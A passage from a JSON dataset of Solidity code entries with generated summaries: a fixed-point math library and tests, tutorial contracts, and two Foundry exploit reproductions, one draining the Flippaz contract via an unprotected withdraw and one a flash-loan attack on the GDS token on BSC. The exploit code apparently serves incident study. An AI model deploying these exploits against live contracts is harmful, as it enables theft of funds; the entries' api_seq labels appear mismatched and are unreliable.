~quadratically.\n\n            // We check y >= 2^(k + 8) but shift right by k bits\n            // each branch to ensure that if x >= 256, then y >= 256.\n            if iszero(lt(y, 0x10000000000000000000000000000000000)) {\n                y := shr(128, y)\n                z := shl(64, z)\n            }\n            if iszero(lt(y, 0x1000000000000000000)) {\n                y := shr(64, y)\n                z := shl(32, z)\n            }\n            if iszero(lt(y, 0x10000000000)) {\n                y := shr(32, y)\n                z := shl(16, z)\n            }\n            if iszero(lt(y, 0x1000000)) {\n                y := shr(16, y)\n                z := shl(8, z)\n            }\n\n            // Goal was to get z*z*y within a small factor of x. More iterations could\n            // get y in a tighter range. Currently, we will have y in [256, 256*2^16).\n            // We ensured y >= 256 so that the relative difference between y and y+1 is small.\n            // That's not possible if x < 256 but we can just verify those cases exhaustively.\n\n            // Now, z*z*y <= x < z*z*(y+1), and y <= 2^(16+8), and either y >= 256, or x < 256.\n            // Correctness can be checked exhaustively for x < 256, so we assume y >= 256.\n            // Then z*sqrt(y) is within sqrt(257)/sqrt(256) of sqrt(x), or about 20bps.\n\n            // For s in the range [1/256, 256], the estimate f(s) = (181/1024) * (s+1) is in the range\n            // (1/2.84 * sqrt(s), 2.84 * sqrt(s)), with largest error when s = 1 and when s = 256 or 1/256.\n\n            // Since y is in [256, 256*2^16), let a = y/65536, so that a is in [1/256, 256). Then we can estimate\n            // sqrt(y) using sqrt(65536) * 181/1024 * (a + 1) = 181/4 * (y + 65536)/65536 = 181 * (y + 65536)/2^18.\n\n            // There is no overflow risk here since y < 2^136 after the first branch above.\n            z := shr(18, mul(z, add(y, 65536))) // A mul() is saved from starting z at 181.\n\n            // Given the worst case multiplicative error of 2.84 above, 7 iterations should be enough.\n            z := shr(1, add(z, div(x, z)))\n            z := shr(1, add(z, div(x, z)))\n            z := shr(1, add(z, div(x, z)))\n            z := shr(1, add(z, div(x, z)))\n            z := shr(1, add(z, div(x, z)))\n            z := shr(1, add(z, div(x, z)))\n            z := shr(1, add(z, div(x, z)))\n\n            // If x+1 is a perfect square, the Babylonian method cycles between\n            // floor(sqrt(x)) and ceil(sqrt(x)). This statement ensures we return floor.\n            // See: https://en.wikipedia.org/wiki/Integer_square_root#Using_only_integer_division\n            // Since the ceil is rare, we save gas on the assignment and repeat division in the rare case.\n            // If you don't care whether the floor or ceil square root is returned, you can remove this statement.\n            z := sub(z, lt(div(x, z), z))\n        }\n    }\n\n    function unsafeMod(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Mod x by y. Note this will return\n            // 0 instead of reverting if y is zero.\n            z := mod(x, y)\n        }\n    }\n\n    function unsafeDiv(uint256 x, uint256 y) internal pure returns (uint256 r) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Divide x by y. Note this will return\n            // 0 instead of reverting if y is zero.\n            r := div(x, y)\n        }\n    }\n\n    function unsafeDivUp(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        /// @solidity memory-safe-assembly\n        assembly {\n            // Add 1 to x * y if x % y > 0. Note this will\n            // return 0 instead of reverting if y is zero.\n            z := add(gt(mod(x, y), 0), div(x, y))\n        }\n    }\n}\n",
        "summary": "This is a Solidity library that provides fixed-point arithmetic operations for Ethereum contracts. It contains functions for operations like multiplication and division of fixed-point numbers, as well as a function for calculating the square root of a number. The library uses assembly code to perform these operations efficiently and safely in the EVM.",
        "id": "5f9d2baf-0153-4683-906d-f5e4cbfa68f9",
        "api_seq": "FixedPointMathLib.t"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.15;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\n\nimport {FixedPointMathLib} from \"../utils/FixedPointMathLib.sol\";\n\ncontract FixedPointMathLibTest is DSTestPlus {\n    function testMulWadDown() public {\n        assertEq(FixedPointMathLib.mulWadDown(2.5e18, 0.5e18), 1.25e18);\n        assertEq(FixedPointMathLib.mulWadDown(3e18, 1e18), 3e18);\n        assertEq(FixedPointMathLib.mulWadDown(369, 271), 0);\n    }\n\n    function testMulWadDownEdgeCases() public {\n        assertEq(FixedPointMathLib.mulWadDown(0, 1e18), 0);\n        assertEq(FixedPointMathLib.mulWadDown(1e18, 0), 0);\n        assertEq(FixedPointMathLib.mulWadDown(0, 0), 0);\n    }\n\n    function testMulWadUp() public {\n        assertEq(FixedPointMathLib.mulWadUp(2.5e18, 0.5e18), 1.25e18);\n        assertEq(FixedPointMathLib.mulWadUp(3e18, 1e18), 3e18);\n        assertEq(FixedPointMathLib.mulWadUp(369, 271), 1);\n    }\n\n    function testMulWadUpEdgeCases() public {\n        assertEq(FixedPointMathLib.mulWadUp(0, 1e18), 0);\n        assertEq(FixedPointMathLib.mulWadUp(1e18, 0), 0);\n        assertEq(FixedPointMathLib.mulWadUp(0, 0), 0);\n    }\n\n    function testDivWadDown() public {\n        assertEq(FixedPointMathLib.divWadDown(1.25e18, 0.5e18), 2.5e18);\n        assertEq(FixedPointMathLib.divWadDown(3e18, 1e18), 3e18);\n        assertEq(FixedPointMathLib.divWadDown(2, 100000000000000e18), 0);\n    }\n\n    function testDivWadDownEdgeCases() public {\n        assertEq(FixedPointMathLib.divWadDown(0, 1e18), 0);\n    }\n\n    function testFailDivWadDownZeroDenominator() public pure {\n        FixedPointMathLib.divWadDown(1e18, 0);\n    }\n\n    function testDivWadUp() public {\n        assertEq(FixedPointMathLib.divWadUp(1.25e18, 0.5e18), 2.5e18);\n        assertEq(FixedPointMathLib.divWadUp(3e18, 1e18), 3e18);\n        assertEq(FixedPointMathLib.divWadUp(2, 100000000000000e18), 1);\n    }\n\n    function testDivWadUpEdgeCases() public {\n        assertEq(FixedPointMathLib.divWadUp(0, 1e18), 0);\n    }\n\n    function testFailDivWadUpZeroDenominator() public pure {\n        FixedPointMathLib.divWadUp(1e18, 0);\n    }\n\n    function testMulDivDown() public {\n        assertEq(FixedPointMathLib.mulDivDown(2.5e27, 0.5e27, 1e27), 1.25e27);\n        assertEq(FixedPointMathLib.mulDivDown(2.5e18, 0.5e18, 1e18), 1.25e18);\n        assertEq(FixedPointMathLib.mulDivDown(2.5e8, 0.5e8, 1e8), 1.25e8);\n        assertEq(FixedPointMathLib.mulDivDown(369, 271, 1e2), 999);\n\n        assertEq(FixedPointMathLib.mulDivDown(1e27, 1e27, 2e27), 0.5e27);\n        assertEq(FixedPointMathLib.mulDivDown(1e18, 1e18, 2e18), 0.5e18);\n        assertEq(FixedPointMathLib.mulDivDown(1e8, 1e8, 2e8), 0.5e8);\n\n        assertEq(FixedPointMathLib.mulDivDown(2e27, 3e27, 2e27), 3e27);\n        assertEq(FixedPointMathLib.mulDivDown(3e18, 2e18, 3e18), 2e18);\n        assertEq(FixedPointMathLib.mulDivDown(2e8, 3e8, 2e8), 3e8);\n    }\n\n    function testMulDivDownEdgeCases() public {\n        assertEq(FixedPointMathLib.mulDivDown(0, 1e18, 1e18), 0);\n        assertEq(FixedPointMathLib.mulDivDown(1e18, 0, 1e18), 0);\n        assertEq(FixedPointMathLib.mulDivDown(0, 0, 1e18), 0);\n    }\n\n    function testFailMulDivDownZeroDenominator() public pure {\n        FixedPointMathLib.mulDivDown(1e18, 1e18, 0);\n    }\n\n    function testMulDivUp() public {\n        assertEq(FixedPointMathLib.mulDivUp(2.5e27, 0.5e27, 1e27), 1.25e27);\n        assertEq(FixedPointMathLib.mulDivUp(2.5e18, 0.5e18, 1e18), 1.25e18);\n        assertEq(FixedPointMathLib.mulDivUp(2.5e8, 0.5e8, 1e8), 1.25e8);\n        assertEq(FixedPointMathLib.mulDivUp(369, 271, 1e2), 1000);\n\n        assertEq(FixedPointMathLib.mulDivUp(1e27, 1e27, 2e27), 0.5e27);\n        assertEq(FixedPointMathLib.mulDivUp(1e18, 1e18, 2e18), 0.5e18);\n        assertEq(FixedPointMathLib.mulDivUp(1e8, 1e8, 2e8), 0.5e8);\n\n        assertEq(FixedPointMathLib.mulDivUp(2e27, 3e27, 2e27), 3e27);\n        assertEq(FixedPointMathLib.mulDivUp(3e18, 2e18, 3e18), 2e18);\n        assertEq(FixedPointMathLib.mulDivUp(2e8, 3e8, 2e8), 3e8);\n    }\n\n    function testMulDivUpEdgeCases() public {\n        assertEq(FixedPointMathLib.mulDivUp(0, 1e18, 1e18), 0);\n        assertEq(FixedPointMathLib.mulDivUp(1e18, 0, 1e18), 0);\n        assertEq(FixedPointMathLib.mulDivUp(0, 0, 1e18), 0);\n    }\n\n    function testFailMulDivUpZeroDenominator() public pure {\n        FixedPointMathLib.mulDivUp(1e18, 1e18, 0);\n    }\n\n    function testRPow() public {\n        assertEq(FixedPointMathLib.rpow(2e27, 2, 1e27), 4e27);\n        assertEq(FixedPointMathLib.rpow(2e18, 2, 1e18), 4e18);\n        assertEq(FixedPointMathLib.rpow(2e8, 2, 1e8), 4e8);\n        assertEq(FixedPointMathLib.rpow(8, 3, 1), 512);\n    }\n\n    function testSqrt() public {\n        assertEq(FixedPointMathLib.sqrt(0), 0);\n        assertEq(FixedPointMathLib.sqrt(1), 1);\n        assertEq(FixedPointMathLib.sqrt(2704), 52);\n        assertEq(FixedPointMathLib.sqrt(110889), 333);\n        assertEq(FixedPointMathLib.sqrt(32239684), 5678);\n        assertEq(FixedPointMathLib.sqrt(type(uint256).max), 340282366920938463463374607431768211455);\n    }\n\n    function testSqrtBackHashedSingle() public {\n        testSqrtBackHashed(123);\n    }\n\n    function testMulWadDown(uint256 x, uint256 y) public {\n        // Ignore cases where x * y overflows.\n        unchecked {\n            if (x != 0 && (x * y) / x != y) return;\n        }\n\n        assertEq(FixedPointMathLib.mulWadDown(x, y), (x * y) / 1e18);\n    }\n\n    function testFailMulWadDownOverflow(uint256 x, uint256 y) public pure {\n        // Ignore cases where x * y does not overflow.\n        unchecked {\n            if ((x * y) / x == y) revert();\n        }\n\n        FixedPointMathLib.mulWadDown(x, y);\n    }\n\n    function testMulWadUp(uint256 x, uint256 y) public {\n        // Ignore cases where x * y overflows.\n        unchecked {\n            if (x != 0 && (x * y) / x != y) return;\n        }\n\n        assertEq(FixedPointMathLib.mulWadUp(x, y), x * y == 0 ? 0 : (x * y - 1) / 1e18 + 1);\n    }\n\n    function testFailMulWadUpOverflow(uint256 x, uint256 y) public pure {\n        // Ignore cases where x * y does not overflow.\n        unchecked {\n            if ((x * y) / x == y) revert();\n        }\n\n        FixedPointMathLib.mulWadUp(x, y);\n    }\n\n    function testDivWadDown(uint256 x, uint256 y) public {\n        // Ignore cases where x * WAD overflows or y is 0.\n        unchecked {\n            if (y == 0 || (x != 0 && (x * 1e18) / 1e18 != x)) return;\n        }\n\n        assertEq(FixedPointMathLib.divWadDown(x, y), (x * 1e18) / y);\n    }\n\n    function testFailDivWadDownOverflow(uint256 x, uint256 y) public pure {\n        // Ignore cases where x * WAD does not overflow or y is 0.\n        unchecked {\n            if (y == 0 || (x * 1e18) / 1e18 == x) revert();\n        }\n\n        FixedPointMathLib.divWadDown(x, y);\n    }\n\n    function testFailDivWadDownZeroDenominator(uint256 x) public pure {\n        FixedPointMathLib.divWadDown(x, 0);\n    }\n\n    function testDivWadUp(uint256 x, uint256 y) public {\n        // Ignore cases where x * WAD overflows or y is 0.\n        unchecked {\n            if (y == 0 || (x != 0 && (x * 1e18) / 1e18 != x)) return;\n        }\n\n        assertEq(FixedPointMathLib.divWadUp(x, y), x == 0 ? 0 : (x * 1e18 - 1) / y + 1);\n    }\n\n    function testFailDivWadUpOverflow(uint256 x, uint256 y) public pure {\n        // Ignore cases where x * WAD does not overflow or y is 0.\n        unchecked {\n            if (y == 0 || (x * 1e18) / 1e18 == x) revert();\n        }\n\n        FixedPointMathLib.divWadUp(x, y);\n    }\n\n    function testFailDivWadUpZeroDenominator(uint256 x) public pure {\n        FixedPointMathLib.divWadUp(x, 0);\n    }\n\n    function testMulDivDown(\n        uint256 x,\n        uint256 y,\n        uint256 denominator\n    ) public {\n        // Ignore cases where x * y overflows or denominator is 0.\n        unchecked {\n            if (denominator == 0 || (x != 0 && (x * y) / x != y)) return;\n        }\n\n        assertEq(FixedPointMathLib.mulDivDown(x, y, denominator), (x * y) / denominator);\n    }\n\n    function testFailMulDivDownOverflow(\n        uint256 x,\n        uint256 y,\n        uint256 denominator\n    ) public pure {\n        // Ignore cases where x * y does not overflow or denominator is 0.\n        unchecked {\n            if (denominator == 0 || (x * y) / x == y) revert();\n        }\n\n        FixedPointMathLib.mulDivDown(x, y, denominator);\n    }\n\n    function testFailMulDivDownZeroDenominator(uint256 x, uint256 y) public pure {\n        FixedPointMathLib.mulDivDown(x, y, 0);\n    }\n\n    function testMulDivUp(\n        uint256 x,\n        uint256 y,\n        uint256 denominator\n    ) public {\n        // Ignore cases where x * y overflows or denominator is 0.\n        unchecked {\n            if (denominator == 0 || (x != 0 && (x * y) / x != y)) return;\n        }\n\n        assertEq(FixedPointMathLib.mulDivUp(x, y, denominator), x * y == 0 ? 0 : (x * y - 1) / denominator + 1);\n    }\n\n    function testFailMulDivUpOverflow(\n        uint256 x,\n        uint256 y,\n        uint256 denominator\n    ) public pure {\n        // Ignore cases where x * y does not overflow or denominator is 0.\n        unchecked {\n            if (denominator == 0 || (x * y) / x == y) revert();\n        }\n\n        FixedPointMathLib.mulDivUp(x, y, denominator);\n    }\n\n    function testFailMulDivUpZeroDenominator(uint256 x, uint256 y) public pure {\n        FixedPointMathLib.mulDivUp(x, y, 0);\n    }\n\n    function testDifferentiallyFuzzSqrt(uint256 x) public {\n        assertEq(FixedPointMathLib.sqrt(x), uniswapSqrt(x));\n        assertEq(FixedPointMathLib.sqrt(x), abdkSqrt(x));\n    }\n\n    function testSqrt(uint256 x) public {\n        uint256 root = FixedPointMathLib.sqrt(x);\n        uint256 next = root + 1;\n\n        // Ignore cases where next * next overflows.\n        unchecked {\n            if (next * next < next) return;\n        }\n\n        assertTrue(root * root <= x && next * next > x);\n    }\n\n    function testSqrtBack(uint256 x) public {\n        unchecked {\n            x >>= 128;\n            while (x != 0) {\n                assertEq(FixedPointMathLib.sqrt(x * x), x);\n                x >>= 1;\n            }\n        }\n    }\n\n    function testSqrtBackHashed(uint256 x) public {\n        testSqrtBack(uint256(keccak256(abi.encode(x))));\n    }\n\n    function uniswapSqrt(uint256 y) internal pure returns (uint256 z) {\n        if (y > 3) {\n            z = y;\n            uint256 x = y / 2 + 1;\n            while (x < z) {\n                z = x;\n                x = (y / x + x) / 2;\n            }\n        } else if (y != 0) {\n            z = 1;\n        }\n    }\n\n    function abdkSqrt(uint256 x) private pure returns (uint256) {\n        unchecked {\n            if (x == 0) return 0;\n            else {\n                uint256 xx = x;\n                uint256 r = 1;\n                if (xx >= 0x100000000000000000000000000000000) {\n                    xx >>= 128;\n                    r <<= 64;\n                }\n                if (xx >= 0x10000000000000000) {\n                    xx >>= 64;\n                    r <<= 32;\n                }\n                if (xx >= 0x100000000) {\n                    xx >>= 32;\n                    r <<= 16;\n                }\n                if (xx >= 0x10000) {\n                    xx >>= 16;\n                    r <<= 8;\n                }\n                if (xx >= 0x100) {\n                    xx >>= 8;\n                    r <<= 4;\n                }\n                if (xx >= 0x10) {\n                    xx >>= 4;\n                    r <<= 2;\n                }\n                if (xx >= 0x8) {\n                    r <<= 1;\n                }\n                r = (r + x / r) >> 1;\n                r = (r + x / r) >> 1;\n                r = (r + x / r) >> 1;\n                r = (r + x / r) >> 1;\n                r = (r + x / r) >> 1;\n                r = (r + x / r) >> 1;\n                r = (r + x / r) >> 1; // Seven iterations should be enough\n                uint256 r1 = x / r;\n                return r < r1 ? r : r1;\n            }\n        }\n    }\n}\n",
        "summary": "This is a Solidity contract for testing a library called \"FixedPointMathLib\". The contract contains various test functions for functions in the library, such as `mulWadDown`, `divWadUp`, `mulDivDown`, etc. These functions perform mathematical operations on fixed-point numbers in order to avoid precision errors when dealing with decimal numbers. The tests are checking that the functions in the library are behaving as expected, and that they handle edge cases and possible errors correctly. The contract also contains helper functions to test the accuracy of the `sqrt` function, which is used for calculating square roots of integers.",
        "id": "5284a25b-ee0a-470a-800a-e11fa80462f3",
        "api_seq": "FlippazOne"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  Flippaz FlippazOne = Flippaz(0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944);\n\n  function setUp() public {\n    cheat.createSelectFork(\"mainnet\", 15083765); // fork mainnet at block 15083765\n  }\n\n  function testExploit() public {\n    address alice = cheat.addr(1);\n    emit log_named_uint(\n      \"Before exploiting, ETH balance of FlippazOne Contract:\",\n      address(FlippazOne).balance\n    );\n    cheat.prank(msg.sender);\n    FlippazOne.bid{ value: 2 ether }();\n    emit log_named_uint(\n      \"After bidding, ETH balance of FlippazOne Contract:\",\n      address(FlippazOne).balance\n    );\n\n    //Attacker try to call ownerWithdrawAllTo() to drain all ETH from FlippazOne contract\n    FlippazOne.ownerWithdrawAllTo(address(alice));\n    emit log_named_uint(\n      \"After exploiting, ETH balance of FlippazOne Contract:\",\n      address(FlippazOne).balance\n    );\n    emit log_named_uint(\n      \"ETH balance of attacker Alice:\",\n      address(alice).balance\n    );\n  }\n}\n",
        "summary": "This code is a Solidity smart contract that tests an exploit on a specific contract called Flippaz. The `setUp` function creates a fork of the main Ethereum network at a specific block number. The `testExploit` function first logs the ETH balance of the Flippaz contract, then invokes a prank function before bidding on the Flippaz contract for 2 ether. Next, the contract attempts to transfer all ETH from the Flippaz contract to an address called Alice. In the end, the code logs the ETH balance of the Flippaz contract and the address Alice. The purpose of this code is to test whether the exploit to drain all ETH from the Flippaz contract is successful.",
        "id": "d561b46e-03f6-4751-b88a-65d8fd4f72c2",
        "api_seq": "HackDao_exp"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// By 0xAA\npragma solidity ^0.8.4;\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\n\n// \u6211\u4eec\u5c1d\u8bd5frontrun\u4e00\u7b14Free mint\u4ea4\u6613\ncontract FreeMint is ERC721 {\n    uint256 totalSupply;\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316NFT\u5408\u96c6\u7684\u540d\u79f0\u3001\u4ee3\u53f7\n    constructor() ERC721(\"Free Mint NFT\", \"FreeMint\"){}\n\n    // \u94f8\u9020\u51fd\u6570\n    function mint() external {\n        _mint(msg.sender, totalSupply); // mint\n        totalSupply++;\n    }\n}",
        "summary": "This is a smart contract written in Solidity that extends the standard ERC721 contract to create a new token contract called \"Free Mint NFT\". The contract allows for the creation of new tokens through the \"mint\" function, which can be called externally by anyone. When a new token is minted, it is assigned to the address that called the function and the total supply of tokens is incremented by one. This is a simple implementation of an NFT contract that can be used to experiment with \"frontrunning\" a transaction.",
        "id": "4e6f7682-f9b2-43b3-b7b4-565b11542981",
        "api_seq": "IBatchDistributor"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ncontract FunctionTypes{\n    uint256 public number = 5;\n    \n    constructor() payable {}\n\n    // \u51fd\u6570\u7c7b\u578b\n    // function (<parameter types>) {internal|external} [pure|view|payable] [returns (<return types>)]\n    // \u9ed8\u8ba4function\n    function add() external{\n        number = number + 1;\n    }\n\n    // pure: \u7eaf\u7eaf\u725b\u9a6c\n    function addPure(uint256 _number) external pure returns(uint256 new_number){\n        new_number = _number+1;\n    }\n    \n    // view: \u770b\u5ba2\n    function addView() external view returns(uint256 new_number) {\n        new_number = number + 1;\n    }\n\n    // internal: \u5185\u90e8\n    function minus() internal {\n        number = number - 1;\n    }\n\n    // \u5408\u7ea6\u5185\u7684\u51fd\u6570\u53ef\u4ee5\u8c03\u7528\u5185\u90e8\u51fd\u6570\n    function minusCall() external {\n        minus();\n    }\n\n    // payable: \u9012\u94b1\uff0c\u80fd\u7ed9\u5408\u7ea6\u652f\u4ed8eth\u7684\u51fd\u6570\n    function minusPayable() external payable returns(uint256 balance) {\n        minus();    \n        balance = address(this).balance;\n    }\n}",
        "summary": "This code is a Solidity smart contract that defines a FunctionTypes contract. It includes several functions that show examples of different function types, such as internal, external, pure, view, and payable. It also has a constructor function that is payable (can receive Ether). The functions modify or retrieve a public variable called number which is set to 5 initially. The code includes comments explaining each function type and its purpose.",
        "id": "e37ccbf6-4eb3-4d27-8c1a-b1acce22d6a6",
        "api_seq": "IERC721ABurnable"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Gas {\n\n    string[] dataStore;\n\n    function cheap(uint a, uint b)\n        public\n        pure\n        returns (uint c)\n    {\n        c = a + b;\n    }\n\n    function expensive(string memory val)\n        public\n    {\n        dataStore.push(val);\n    }\n\n    function average()\n        public\n        view\n        returns (string memory)\n    {\n        return dataStore[0];\n    }\n\n    function low()\n        public\n        pure\n        returns (string memory)\n    {\n        string memory myString = \"test\";\n        return myString;\n    }\n}\n",
        "summary": "This is a smart contract written in Solidity, which is executed on the Ethereum blockchain. \n\nThe code defines a contract called \"Gas\", which has four functions:\n\n1. The \"cheap\" function takes two numbers and returns their sum. This function doesn't modify the blockchain and can be executed for a low cost.\n\n2. The \"expensive\" function takes a string parameter and adds it to an array called \"dataStore\". This function modifies the blockchain and incurs a high cost.\n\n3. The \"average\" function returns the first element of the \"dataStore\" array. This function only reads data from the blockchain and doesn't modify it.\n\n4. The \"low\" function returns a predefined string \"test\". This function doesn't read or modify the blockchain and can be executed for a low cost.",
        "id": "a3e5f43c-8096-42a8-9432-6021b9731ade",
        "api_seq": "Interface"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1610095490368180224\n// https://twitter.com/BlockSecTeam/status/1610167174978760704\n// @TX\n// https://bscscan.com/tx/0xf9b6cc083f6e0e41ce5e5dd65b294abf577ef47c7056d86315e5e53aa662251e\n// https://bscscan.com/tx/0x2bb704e0d158594f7373ec6e53dc9da6c6639f269207da8dab883fc3b5bf6694\n\ninterface GDSToken is IERC20{\n    function pureUsdtToToken(uint256 _uAmount) external returns(uint256);\n}\n\ninterface ISwapFlashLoan{\n    function flashLoan(\n        address receiver,\n        address token,\n        uint256 amount,\n        bytes memory params\n    ) external;\n}\n\ninterface IClaimReward{\n    function transferToken() external;\n    function withdraw() external;\n}\n\ncontract ClaimReward{\n    address Owner;\n    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address deadAddress = 0x000000000000000000000000000000000000dEaD;\n\n    constructor(){\n        Owner = msg.sender;\n    }\n\n    function transferToken() external{\n        GDS.transfer(deadAddress, GDS.pureUsdtToToken(100 * 1e18));\n        Pair.transfer(Owner, Pair.balanceOf(address(this)));\n    }\n\n    function withdraw() external{\n        GDS.transfer(deadAddress, 10_000);\n        Pair.transfer(Owner, Pair.balanceOf(address(this)));\n        GDS.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(GDS);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            GDS.balanceOf(address(this)),\n            0,\n            path,\n            Owner,\n            block.timestamp\n        );\n\n    }\n}\n\ncontract ContractTest is DSTest{\n    GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    ISwapFlashLoan swapFlashLoan = ISwapFlashLoan(0x28ec0B36F0819ecB5005cAB836F4ED5a2eCa4D13);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);\n    address[] contractList;\n    uint PerContractGDSAmount;\n    uint SwapFlashLoanAmount;\n    uint dodoFlashLoanAmount;\n    address deadAddress = 0x000000000000000000000000000000000000dEaD;\n    address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 24449918); \n        cheats.label(address(GDS), \"GDS\");\n        cheats.label(address(USDT), \"USDT\");\n    }\n\n    function testExploit() public {\n        address(WBNB).call{value: 50 ether}(\"\");\n        WBNBToUSDT();\n        USDTToGDS(10 * 1e18);\n        GDSUSDTAddLiquidity(10 * 1e18, GDS.balanceOf(address(this)));\n        USDTToGDS(USDT.balanceOf(address(this)));\n        PerContractGDSAmount = GDS.balanceOf(address(this)) / 100;\n        ClaimRewardFactory();\n\n        cheats.roll(block.number + 1100);\n        SwapFlashLoan();\n\n        emit log_named_decimal_uint(\"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)) - 50 * 250 * 1e18, USDT.decimals());\n    }\n\n    function SwapFlashLoan() internal{\n        SwapFlashLoanAmount = USDT.balanceOf(address(swapFlashLoan));\n        swapFlashLoan.flashLoan(address(this), address(USDT), SwapFlashLoanAmount, new bytes(1));\n    }\n\n    function executeOperation(\n        address pool,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata params\n    ) external{\n        DODOFLashLoan();\n        USDT.transfer(address(swapFlashLoan), SwapFlashLoanAmount * 10000 / 9992 + 1000);\n    }\n\n    function DODOFLashLoan() internal{\n        dodoFlashLoanAmount = USDT.balanceOf(dodo);\n        DVM(dodo).flashLoan(0, dodoFlashLoanAmount, address(this), new bytes(1));\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        USDTToGDS(600_000 * 1e18);\n        GDSUSDTAddLiquidity(USDT.balanceOf(address(this)), GDS.balanceOf(address(this)));\n        WithdrawRewardFactory();\n        GDSUSDTRemovLiquidity();\n        GDSToUSDT();\n        USDT.transfer(dodo, dodoFlashLoanAmount);\n    }\n\n    function ClaimRewardFactory() internal{\n        for(uint i = 0; i < 100; i++){\n            ClaimReward claim = new ClaimReward();\n            contractList.push(address(claim));\n            Pair.transfer(address(claim), Pair.balanceOf(address(this)));\n            GDS.transfer(address(claim), PerContractGDSAmount);\n            claim.transferToken();\n        }        \n    }\n\n    function WithdrawRewardFactory() internal{\n        for(uint i = 0; i < 100; i++){\n            Pair.transfer(contractList[i], Pair.balanceOf(address(this)));\n            IClaimReward(contractList[i]).withdraw();\n        }\n    }\n\n    function WBNBToUSDT() internal{\n        WBNB.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function USDTToGDS(uint USDTAmount) internal{\n        USDT.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(GDS);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            USDTAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function GDSUSDTAddLiquidity(uint USDTAmount, uint GDSAmount) internal{\n        USDT.approve(address(Router), type(uint).max);\n        GDS.approve(address(Router), type(uint).max);\n        Router.addLiquidity(address(USDT), address(GDS), USDTAmount, GDSAmount, 0, 0, address(this), block.timestamp);\n    }\n\n    function GDSUSDTRemovLiquidity() internal{\n        Pair.approve(address(Router), type(uint).max);\n        Router.removeLiquidity(address(USDT), address(GDS), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp);\n    }\n\n    function GDSToUSDT() internal{\n        GDS.approve(address(Router), type(uint).max);\n        address [] memory path = new address[](2);\n        path[0] = address(GDS);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            GDS.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}",
        "summary": "The code is for a smart contract on the Binance Smart Chain. It includes several interfaces and contracts to interact with different tokens, such as GDSToken, USDT, Uni_Pair_V2, and Uni_Router_V2. The main function of the code is to exploit a flash loan vulnerability in the DODO decentralized exchange. The attacker creates 100 smart contracts and transfers GDS tokens to each of them. Then the attacker triggers a flash loan from the ISwapFlashLoan contract by borrowing USDT tokens and repaying them later. The borrowed USDT is then used to conduct a DODO flash loan. During this flash loan, the attacker swaps some GDS tokens for USDT, removes liquidity from the GDS-USDT pair, and then exchanges the GDS tokens for more USDT. The attacker finally transfers the USDT back to the DODO flash loan contract and completes the attack.",
        "id": "79b83ec2-500a-488e-b191-656d0978b299",
        "api_seq": "InterfaceDemo"
    },
    {
